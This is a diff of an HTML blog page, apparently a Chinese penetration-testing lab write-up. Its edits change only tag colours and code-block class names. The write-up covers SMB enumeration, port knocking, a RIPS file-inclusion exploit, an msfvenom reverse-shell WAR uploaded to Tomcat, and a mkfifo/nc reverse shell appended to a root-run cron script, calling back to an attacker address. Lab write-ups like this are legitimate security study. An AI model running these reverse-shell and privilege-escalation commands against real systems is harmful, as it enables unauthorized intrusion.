@@ -203,14 +203,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/Writeup/" style="color: #ffa2c4">
+                <a href="/tags/Writeup/" style="color: #ff7d73">
                     Writeup
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00bcd4">
+                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #ffa2c4">
                     网安
                 </a>
             </span>
@@ -231,14 +231,14 @@
 <p>找到了一个robots.txt，访问发现禁止爬虫访问&#x2F;tryharder&#x2F;tryharder。我们访问一下。</p>
 <p><img src="image-20250331161619119.png" alt="image-20250331161619119"></p>
 <p>一串base64。解码一下，指令：</p>
-<pre><code class="bash">echo &quot;base64&quot; | base64 -d
+<pre><code class="language-bash">echo &quot;base64&quot; | base64 -d
 </code></pre>
 <p>提示有一个用户的密码是password，需要获取用户名。联想到前面还有samba服务，我们对samba服务进行一下枚举。</p>
-<pre><code class="bash">enum4linux -a 192.168.23.158
+<pre><code class="language-bash">enum4linux -a 192.168.23.158
 </code></pre>
 <p><img src="image-20250331161842760.png" alt="image-20250331161842760"></p>
 <p>告诉我们靶机有4个用户。看一下文件共享情况。</p>
-<pre><code class="bash">smbclient \\\\192.168.23.158\\qiu -U qiu
+<pre><code class="language-bash">smbclient \\\\192.168.23.158\\qiu -U qiu
 </code></pre>
 <p>需要登录，用password作为密码，成功登录。</p>
 <p><img src="image-20250331162206906.png" alt="image-20250331162206906"></p>
@@ -249,7 +249,7 @@
 <p><code>get config</code></p>
 <p>然后查看，是敲门口令，给了一个敲门顺序。</p>
 <p>那就敲一下。</p>
-<pre><code class="bash">knock 192.168.23.158 159 27391 4 -v
+<pre><code class="language-bash">knock 192.168.23.158 159 27391 4 -v
 </code></pre>
 <p>然后再nmap一下，80端口就开放了。</p>
 <p>访问192.168.23.158，没什么有用的信息。</p>
@@ -258,10 +258,10 @@
 <p>禁止爬虫访问了两个路径：&#x2F;mercy和&#x2F;nomercy。逐个访问</p>
 <p>&#x2F;mercy目录没有什么有用的信息，看看nomercy。</p>
 <p>是一个rips服务，版本号为0.53。看一下有没有可利用的漏洞。</p>
-<pre><code class="bash">searchsploit rips 0.53
+<pre><code class="language-bash">searchsploit rips 0.53
 </code></pre>
 <p>了解到有一个文件包含漏洞，来看一下如何实现。</p>
-<pre><code class="bash">searchsploit -m php/webapps/18660.txt
+<pre><code class="language-bash">searchsploit -m php/webapps/18660.txt
 </code></pre>
 <p>了解到我们需要访问&#x2F;rips&#x2F;windows&#x2F;code.php，有一个file参数可以复现该漏洞。</p>
 <p>加到url上。因为rips被改为了nomercy，同样地把PoC中的rips改为nomercy</p>
@@ -272,19 +272,19 @@
 <p>找到了两个用户：thisisasuperduperlonguser和fluffy，同时知道了这两个用户的密码。</p>
 <h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>回到8080端口，然后以thisisasuperduperlonguser的身份登录manager服务。</p>
 <p>找到了个文件上传点，用msfvenom做一个反弹shell挂上去。</p>
-<pre><code class="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.23.159 LPORT=8888 -f war -o  8888.war
+<pre><code class="language-bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.23.159 LPORT=8888 -f war -o  8888.war
 </code></pre>
 <p>然后看一下要访问的jsp</p>
-<pre><code class="bash">7z l 8888.war
+<pre><code class="language-bash">7z l 8888.war
 </code></pre>
 <p><img src="image-20250331164920885.png" alt="image-20250331164920885"></p>
 <p>然后上传并部署。</p>
 <p><img src="image-20250331164957215.png" alt="image-20250331164957215"></p>
 <p>部署好了，准备nc监听。</p>
-<pre><code class="bash">nc -lvnp 8888
+<pre><code class="language-bash">nc -lvnp 8888
 </code></pre>
 <p>然后访问jsp，成功反弹，写个交互</p>
-<pre><code class="bash">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+<pre><code class="language-bash">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
 </code></pre>
 <p>拿到shell，看看有没有sudo权限。</p>
 <p><code>sudo -l</code>要求输入密码，不知道，放弃。</p>
@@ -295,10 +295,10 @@
 <p>输入密码，发现用户sudo被禁用了。</p>
 <p>那就回家目录，看看有无什么有用信息。</p>
 <p>找到家目录下有个隐藏文件夹.private，里面有个定时服务，权限为777，而且执行权限是root。我们可以在这里挂个反弹shell来获取root权限。</p>
-<pre><code class="bash">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.23.159 8888 &gt;/tmp/f&quot; &gt;&gt; timeclock
+<pre><code class="language-bash">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.23.159 8888 &gt;/tmp/f&quot; &gt;&gt; timeclock
 </code></pre>
 <p>另一边，挂个监听</p>
-<pre><code class="bash">nc -lvnp 8888
+<pre><code class="language-bash">nc -lvnp 8888
 </code></pre>
 <p>需要稍微等一小会才能监听到。</p>
 <p><img src="image-20250331170949448.png" alt="image-20250331170949448"></p>
